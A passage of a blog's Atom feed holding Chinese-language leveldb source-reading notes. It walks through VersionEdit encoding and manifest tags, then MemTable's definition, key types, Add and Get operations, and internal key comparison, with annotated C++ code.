class="built_in">std</span>::<span class="built_in">string</span> comparator_;</span><br><span class="line"><span class="keyword">uint64_t</span> log_number_;</span><br><span class="line"><span class="keyword">uint64_t</span> prev_log_number_;</span><br><span class="line"><span class="keyword">uint64_t</span> next_file_number_;</span><br><span class="line">SequenceNumber last_sequence_;</span><br><span class="line"><span class="keyword">bool</span> has_comparator_;</span><br><span class="line"><span class="keyword">bool</span> has_log_number_;</span><br><span class="line"><span class="keyword">bool</span> has_prev_log_number_;</span><br><span class="line"><span class="keyword">bool</span> has_next_file_number_;</span><br><span class="line"><span class="keyword">bool</span> has_last_sequence_;</span><br><span class="line"></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, InternalKey&gt;&gt; compact_pointers_;</span><br><span class="line">DeletedFileSet deleted_files_;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, FileMetaData&gt;&gt; new_files_;</span><br></pre></td></tr></table></figure><p><img data-src="https://bean-li.github.io/assets/LevelDB/write_a_manifest.png" alt="img"></p><p>==EncodeTo==</p><p>编码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">VersionEdit::EncodeTo</span><span class="params">(<span class="built_in">std</span>::<span class="built_in">string</span>* dst)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (has_comparator_) &#123;</span><br><span class="line">    PutVarint32(dst, kComparator);</span><br><span class="line">    PutLengthPrefixedSlice(dst, comparator_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (has_log_number_) &#123;</span><br><span class="line">    PutVarint32(dst, kLogNumber);</span><br><span class="line">    PutVarint64(dst, log_number_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (has_prev_log_number_) &#123;</span><br><span class="line">    PutVarint32(dst, kPrevLogNumber);</span><br><span class="line">    PutVarint64(dst, prev_log_number_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (has_next_file_number_) &#123;</span><br><span class="line">    PutVarint32(dst, kNextFileNumber);</span><br><span class="line">    PutVarint64(dst, next_file_number_);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (has_last_sequence_) &#123;</span><br><span class="line">    PutVarint32(dst, kLastSequence);</span><br><span class="line">    PutVarint64(dst, last_sequence_);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; compact_pointers_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    PutVarint32(dst, kCompactPointer);</span><br><span class="line">    PutVarint32(dst, compact_pointers_[i].first);  <span class="comment">// level</span></span><br><span class="line">    PutLengthPrefixedSlice(dst, compact_pointers_[i].second.Encode());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">auto</span>&amp; deleted_file_kvp : deleted_files_) &#123;</span><br><span class="line">    PutVarint32(dst, kDeletedFile);</span><br><span class="line">    PutVarint32(dst, deleted_file_kvp.first);   <span class="comment">// level</span></span><br><span class="line">    PutVarint64(dst, deleted_file_kvp.second);  <span class="comment">// file number</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; new_files_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    <span class="keyword">const</span> FileMetaData&amp; f = new_files_[i].second;</span><br><span class="line">    PutVarint32(dst, kNewFile);</span><br><span class="line">    PutVarint32(dst, new_files_[i].first);  <span class="comment">// level</span></span><br><span class="line">    PutVarint64(dst, f.number);</span><br><span class="line">    PutVarint64(dst, f.file_size);</span><br><span class="line">    PutLengthPrefixedSlice(dst, f.smallest.Encode());</span><br><span class="line">    PutLengthPrefixedSlice(dst, f.largest.Encode());</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接编码到dst中，这里的string相当于字节数组。</p><h3 id="Manifest具体保存内容？"><a href="#Manifest具体保存内容？" class="headerlink" title="Manifest具体保存内容？"></a>Manifest具体保存内容？</h3><p>其实看到这里，我们知道manifest其实就是保存各个versionedit中的与下面字段对应的数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">enum</span> Tag &#123;</span><br><span class="line">  kComparator = <span class="number">1</span>,</span><br><span class="line">  kLogNumber = <span class="number">2</span>,</span><br><span class="line">  kNextFileNumber = <span class="number">3</span>,</span><br><span class="line">  kLastSequence = <span class="number">4</span>,</span><br><span class="line">  kCompactPointer = <span class="number">5</span>,</span><br><span class="line">  kDeletedFile = <span class="number">6</span>,</span><br><span class="line">  kNewFile = <span class="number">7</span>,</span><br><span class="line">  <span class="comment">// 8 was used for large value refs</span></span><br><span class="line">  kPrevLogNumber = <span class="number">9</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;

&lt;h2 id=&quot;1-Version-相关的数据结构&quot;&gt;&lt;a href=&quot;#1-Version-相关的数据结构&quot; class=&quot;headerlink&quot; title=&quot;1.Version 相关的数据结构&quot;&gt;&lt;/a&gt;1.Version 相关的数据结
      
    
    </summary>
    
    
      <category term="leveldb" scheme="https://www.ravenxrz.ink/categories/leveldb/"/>
    
    
  </entry>
  
  <entry>
    <title>leveldb源码阅读记录-Memtable</title>
    <link href="https://www.ravenxrz.ink/archives/aba77258.html"/>
    <id>https://www.ravenxrz.ink/archives/aba77258.html</id>
    <published>2020-10-12T03:12:58.000Z</published>
    <updated>2020-10-12T03:20:08.903Z</updated>
    
    <content type="html"><![CDATA[<p>上文我们介绍了Skiplist，它是leveldbMemtable的底层数据结构，这篇文章，我们一起来分析MemTable。</p><a id="more"></a><h2 id="1-MemTable定义"><a href="#1-MemTable定义" class="headerlink" title="1. MemTable定义"></a>1. MemTable定义</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MemTable</span> &#123;</span></span><br><span class="line"> <span class="keyword">public</span>:</span><br><span class="line">  <span class="comment">// MemTables are reference counted.  The initial reference count</span></span><br><span class="line">  <span class="comment">// is zero and the caller must call Ref() at least once.</span></span><br><span class="line">  <span class="function"><span class="keyword">explicit</span> <span class="title">MemTable</span><span class="params">(<span class="keyword">const</span> InternalKeyComparator&amp; comparator)</span></span>;</span><br><span class="line"></span><br><span class="line">  MemTable(<span class="keyword">const</span> MemTable&amp;) = <span class="keyword">delete</span>;</span><br><span class="line">  MemTable&amp; <span class="keyword">operator</span>=(<span class="keyword">const</span> MemTable&amp;) = <span class="keyword">delete</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Increase reference count.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Ref</span><span class="params">()</span> </span>&#123; ++refs_; &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Drop reference count.  Delete if no more references exist.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Unref</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    --refs_;</span><br><span class="line">    assert(refs_ &gt;= <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (refs_ &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">delete</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Returns an estimate of the number of bytes of data in use by this</span></span><br><span class="line">  <span class="comment">// data structure. It is safe to call when MemTable is being modified.</span></span><br><span class="line">  <span class="function"><span class="keyword">size_t</span> <span class="title">ApproximateMemoryUsage</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Return an iterator that yields the contents of the memtable.</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">// The caller must ensure that the underlying MemTable remains live</span></span><br><span class="line">  <span class="comment">// while the returned iterator is live.  The keys returned by this</span></span><br><span class="line">  <span class="comment">// iterator are internal keys encoded by AppendInternalKey in the</span></span><br><span class="line">  <span class="comment">// db/format.&#123;h,cc&#125; module.</span></span><br><span class="line">  <span class="function">Iterator* <span class="title">NewIterator</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Add an entry into memtable that maps key to value at the</span></span><br><span class="line">  <span class="comment">// specified sequence number and with the specified type.</span></span><br><span class="line">  <span class="comment">// Typically value will be empty if type==kTypeDeletion.</span></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">Add</span><span class="params">(SequenceNumber seq, ValueType type, <span class="keyword">const</span> Slice&amp; key,</span></span></span><br><span class="line"><span class="function"><span class="params">           <span class="keyword">const</span> Slice&amp; value)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// If memtable contains a value for key, store it in *value and return true.</span></span><br><span class="line">  <span class="comment">// If memtable contains a deletion for key, store a NotFound() error</span></span><br><span class="line">  <span class="comment">// in *status and return true.</span></span><br><span class="line">  <span class="comment">// Else, return false.</span></span><br><span class="line">  <span class="function"><span class="keyword">bool</span> <span class="title">Get</span><span class="params">(<span class="keyword">const</span> LookupKey&amp; key, <span class="built_in">std</span>::<span class="built_in">string</span>* value, Status* s)</span></span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">private</span>:</span><br><span class="line">  <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">MemTableIterator</span>;</span></span><br><span class="line">  <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">MemTableBackwardIterator</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">KeyComparator</span> &#123;</span></span><br><span class="line">    <span class="keyword">const</span> InternalKeyComparator comparator;</span><br><span class="line">    <span class="function"><span class="keyword">explicit</span> <span class="title">KeyComparator</span><span class="params">(<span class="keyword">const</span> InternalKeyComparator&amp; c)</span> : <span class="title">comparator</span><span class="params">(c)</span> </span>&#123;&#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* a, <span class="keyword">const</span> <span class="keyword">char</span>* b)</span> <span class="keyword">const</span></span>;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 注意skiplist存放的key是 const char *类型</span></span><br><span class="line">  <span class="keyword">typedef</span> SkipList&lt;<span class="keyword">const</span> <span class="keyword">char</span>*, KeyComparator&gt; Table;</span><br><span class="line"></span><br><span class="line">  ~MemTable();  <span class="comment">// Private since only Unref() should be used to delete it</span></span><br><span class="line"></span><br><span class="line">  KeyComparator comparator_;</span><br><span class="line">  <span class="keyword">int</span> refs_;</span><br><span class="line">  Arena arena_;</span><br><span class="line">  Table table_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>MemTable里面有3个重要的数据结构：</p><ol><li>KeyComparator ，比较器，在Get操作中会用到。</li><li>Arena，内存分配器，在Add操作中用到。</li><li>SkipList，核心数据结构，管理数据。 <strong>注意key就是一个char *， 内部比较器采用的是InternalKeyComparator.</strong></li></ol><h2 id="2-Key类型分类"><a href="#2-Key类型分类" class="headerlink" title="2. Key类型分类"></a>2. Key类型分类</h2><p>在说memtable的get和add操作前，我们先了解一下 <strong>leveldb 中</strong>的几种key类型。</p><p>在leveldb中做search操作时，search的过程大概是:</p><p>memtable-&gt;immutable memtable -&gt; sstable</p><p>这里涉及到2个search用到的key，一个在memtable中用，一个在sstable中用的key。</p><p>其实还有1个key，那就是用户自己输入的key，user-key。</p><p>总结起来就3种key，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">memtable: 逻辑上称为memtable_key</span><br><span class="line"></span><br><span class="line">sstalbe: 逻辑上称为internal_key</span><br><span class="line"></span><br><span class="line">key: 用户提供的key，我们称之为user_key</span><br></pre></td></tr></table></figure><p>leveldb是如何表示这3种key的？看下图：</p><p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb_key.png" alt="img"></p><p>leveldb用一种类LookupKey包含了这3种key，我们要用的memtable_key其实就是Lookupkey。这一点，也可以从MemTable类的成员函数中可以看出，如Get操作：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If memtable contains a value for key, store it in *value and return true.</span></span><br><span class="line"><span class="comment">// If memtable contains a deletion for key, store a NotFound() error</span></span><br><span class="line"><span class="comment">// in *status and return true.</span></span><br><span class="line"><span class="comment">// Else, return false.</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Get</span><span class="params">(<span class="keyword">const</span> LookupKey&amp; key, <span class="built_in">std</span>::<span class="built_in">string</span>* value, Status* s)</span></span>;</span><br></pre></td></tr></table></figure><h2 id="3-Add-操作"><a href="#3-Add-操作" class="headerlink" title="3. Add 操作"></a>3. Add 操作</h2><p>对key分类有了初步的认识后 ，我们就来看MemTable是如何将一个user key封装成一个memtable_key，然后将key value插入到skiplist中的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Add an entry into memtable that maps key to value at the</span></span><br><span class="line"><span class="comment">// specified sequence number and with the specified type.</span></span><br><span class="line"><span class="comment">// Typically value will be empty if type==kTypeDeletion.</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Add</span><span class="params">(SequenceNumber seq, ValueType type, <span class="keyword">const</span> Slice&amp; key,</span></span></span><br><span class="line"><span class="function"><span class="params">         <span class="keyword">const</span> Slice&amp; value)</span></span>;</span><br></pre></td></tr></table></figure><p>上面是Add的函数签名，注意到函数参数中有一个ValueType类型，我们知道leveldb中删除一个key并不会inplace update,而是插入一个带有删除标记的key。ValueType就是表示当前插入的是一个正常key还是一个删除key:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Value types encoded as the last component of internal keys.</span></span><br><span class="line"><span class="comment">// DO NOT CHANGE THESE ENUM VALUES: they are embedded in the on-disk</span></span><br><span class="line"><span class="comment">// data structures.</span></span><br><span class="line"><span class="keyword">enum</span> ValueType &#123; kTypeDeletion = <span class="number">0x0</span>, kTypeValue = <span class="number">0x1</span> &#125;;</span><br></pre></td></tr></table></figure><p>好了，现在来正式看看Add函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">MemTable::Add</span><span class="params">(SequenceNumber s, ValueType type, <span class="keyword">const</span> Slice&amp; key,</span></span></span><br><span class="line"><span class="function"><span class="params">                   <span class="keyword">const</span> Slice&amp; value)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Format of an entry is concatenation of:</span></span><br><span class="line">  <span class="comment">//  key_size     : varint32 of internal_key.size()</span></span><br><span class="line">  <span class="comment">//  key bytes    : char[internal_key.size()]</span></span><br><span class="line">  <span class="comment">//  value_size   : varint32 of value.size()</span></span><br><span class="line">  <span class="comment">//  value bytes  : char[value.size()]</span></span><br><span class="line">  <span class="keyword">size_t</span> key_size = key.<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">size_t</span> val_size = value.<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">size_t</span> internal_key_size = key_size + <span class="number">8</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> encoded_len = VarintLength(internal_key_size) +</span><br><span class="line">                             internal_key_size + VarintLength(val_size) +</span><br><span class="line">                             val_size;</span><br><span class="line">  <span class="keyword">char</span>* buf = arena_.Allocate(encoded_len);</span><br><span class="line">  <span class="keyword">char</span>* p = EncodeVarint32(buf, internal_key_size);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">memcpy</span>(p, key.data(), key_size);</span><br><span class="line">  p += key_size;</span><br><span class="line">  EncodeFixed64(p, (s &lt;&lt; <span class="number">8</span>) | type);</span><br><span class="line">  p += <span class="number">8</span>;</span><br><span class="line">  p = EncodeVarint32(p, val_size);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">memcpy</span>(p, value.data(), val_size);</span><br><span class="line">  assert(p + val_size == buf + encoded_len);</span><br><span class="line">  table_.Insert(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码很短，基本就是申请一个buf，然后填充数据,最后将buf插入到skiplist中。具体填充的字段如下：</p><p>![](<span class="exturl" data-url="aHR0cHM6Ly9jZG4uanNkZWxpdnIubmV0L2doL3JhdmVueHJ6L1BpY0JlZC9pbWcvbGV2ZWxkYua6kOeggemYheivuy1jb3B5LW1lbXRhYmxl5o+S5YWl5LiA5LiqZW50cnk=" title="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-memtable插入一个entry">https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-memtable插入一个entry<i class="fa fa-external-link"></i></span> (1).png)</p><h2 id="4-Get操作"><a href="#4-Get操作" class="headerlink" title="4. Get操作"></a>4. Get操作</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// If memtable contains a value for key, store it in *value and return true.</span></span><br><span class="line"><span class="comment">// If memtable contains a deletion for key, store a NotFound() error</span></span><br><span class="line"><span class="comment">// in *status and return true.</span></span><br><span class="line"><span class="comment">// Else, return false.</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">MemTable::Get</span><span class="params">(<span class="keyword">const</span> LookupKey&amp; key, <span class="built_in">std</span>::<span class="built_in">string</span>* value, Status* s)</span> </span>&#123;</span><br><span class="line">  Slice memkey = key.memtable_key();</span><br><span class="line">  <span class="function">Table::Iterator <span class="title">iter</span><span class="params">(&amp;table_)</span></span>;</span><br><span class="line">    <span class="comment">// 在skip中找到相应的memkey对应的node</span></span><br><span class="line">  iter.Seek(memkey.data());</span><br><span class="line">  <span class="keyword">if</span> (iter.Valid()) &#123;</span><br><span class="line">    <span class="comment">// entry format is:</span></span><br><span class="line">    <span class="comment">//    klength  varint32</span></span><br><span class="line">    <span class="comment">//    userkey  char[klength]</span></span><br><span class="line">    <span class="comment">//    tag      uint64</span></span><br><span class="line">    <span class="comment">//    vlength  varint32</span></span><br><span class="line">    <span class="comment">//    value    char[vlength]</span></span><br><span class="line">    <span class="comment">// Check that it belongs to same user key.  We do not check the</span></span><br><span class="line">    <span class="comment">// sequence number since the Seek() call above should have skipped</span></span><br><span class="line">    <span class="comment">// all entries with overly large sequence numbers.</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* entry = iter.key();</span><br><span class="line">    <span class="keyword">uint32_t</span> key_length;</span><br><span class="line">      <span class="comment">// 提取memtable key。包括 klength + userkey + tag 字段</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* key_ptr = GetVarint32Ptr(entry, entry + <span class="number">5</span>, &amp;key_length);</span><br><span class="line">    <span class="keyword">if</span> (comparator_.comparator.user_comparator()-&gt;Compare(</span><br><span class="line">            Slice(key_ptr, key_length - <span class="number">8</span>), key.user_key()) == <span class="number">0</span>) &#123;<span class="comment">// 如果找到的key和需要get的key相同</span></span><br><span class="line">      <span class="comment">// Correct user key</span></span><br><span class="line">        <span class="comment">// 获取序列号+type字段</span></span><br><span class="line">      <span class="keyword">const</span> <span class="keyword">uint64_t</span> tag = DecodeFixed64(key_ptr + key_length - <span class="number">8</span>);</span><br><span class="line">      <span class="keyword">switch</span> (<span class="keyword">static_cast</span>&lt;ValueType&gt;(tag &amp; <span class="number">0xff</span>)) &#123;<span class="comment">// &amp; 0xff 取最后1个字节</span></span><br><span class="line">        <span class="keyword">case</span> kTypeValue: &#123;<span class="comment">// 有value</span></span><br><span class="line">          Slice v = GetLengthPrefixedSlice(key_ptr + key_length);</span><br><span class="line">          value-&gt;assign(v.data(), v.<span class="built_in">size</span>());</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">case</span> kTypeDeletion:<span class="comment">// deletion 操作</span></span><br><span class="line">          *s = Status::NotFound(Slice());</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>get的流程：</p><ol><li>根据传入key，到skiplist中找到相应的node</li><li>提取 node中的 memtable_key, 进一步从memtable_key中提取 user_key, 比较这个user_key和用户传入的user_key是否相同</li><li>提取 memtable_key中的tag(包括序列号和type)</li><li>查看type是哪种类型：<ol><li>正常有value，保存value</li><li>是删除的key，在Status s中保存NotFound的结果。</li></ol></li></ol><h2 id="5-在skiplist如何进行key的比较-amp-如果key相同，新旧数据如何确定？"><a href="#5-在skiplist如何进行key的比较-amp-如果key相同，新旧数据如何确定？" class="headerlink" title="5. 在skiplist如何进行key的比较 &amp; 如果key相同，新旧数据如何确定？"></a>5. 在skiplist如何进行key的比较 &amp; 如果key相同，新旧数据如何确定？</h2><p>通过InternalKeyComparator::Compare来确定。</p><p>规则：</p><ol><li>按照key的升序</li><li>key相同，按照序列号降序</li><li>序列号相同，按照type降序</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">InternalKeyComparator::Compare</span><span class="params">(<span class="keyword">const</span> Slice&amp; akey, <span class="keyword">const</span> Slice&amp; bkey)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Order by:</span></span><br><span class="line">  <span class="comment">//    increasing user key (according to user-supplied comparator)</span></span><br><span class="line">  <span class="comment">//    decreasing sequence number</span></span><br><span class="line">  <span class="comment">//    decreasing type (though sequence# should be enough to disambiguate)</span></span><br><span class="line">  <span class="keyword">int</span> r = user_comparator_-&gt;Compare(ExtractUserKey(akey), ExtractUserKey(bkey));</span><br><span class="line">  <span class="keyword">if</span> (r == <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> anum = DecodeFixed64(akey.data() + akey.<span class="built_in">size</span>() - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint64_t</span> bnum = DecodeFixed64(bkey.data() + bkey.<span class="built_in">size</span>() - <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span> (anum &gt; bnum) &#123;</span><br><span class="line">      r = <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (anum &lt; bnum) &#123;</span><br><span class="line">      r = +<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>同时，seq number越大，代表数据越新。</strong></p><h2 id="6-迭代器Iterator"><a href="#6-迭代器Iterator" class="headerlink" title="6. 迭代器Iterator"></a>6. 迭代器Iterator</h2><p>这部分请看 MemTableIterator 。</p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><ol><li><span class="exturl" data-url="aHR0cDovL2Jsb2cuMWZlbmcubWUvMjAxNi8wOS8xMC9sZXZlbGRiLXJlYWQv" title="http://blog.1feng.me/2016/09/10/leveldb-read/">Leveldb源码笔记之读操作<i class="fa fa-external-link"></i></span></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;上文我们介绍了Skiplist，它是leveldbMemtable的底层数据结构，这篇文章，我们一起来分析MemTable。&lt;/p&gt;
    
    </summary>
    
    
      <category term="leveldb" scheme="https://www.ravenxrz.ink/categories/leveldb/"/>
    
    
  </entry>
  
  <entry>
    <title>leveldb源码阅读记录-Memtable基础-Skiplist</title>
    <link href="https://www.ravenxrz.ink/archives/931e70da.html"/>
    <id>https://www.ravenxrz.ink/archives/931e70da.html</id>
    <published>2020-10-12T03:11:33.000Z</published>
    <updated>2020-10-12T03:20:08.905Z</updated>
    
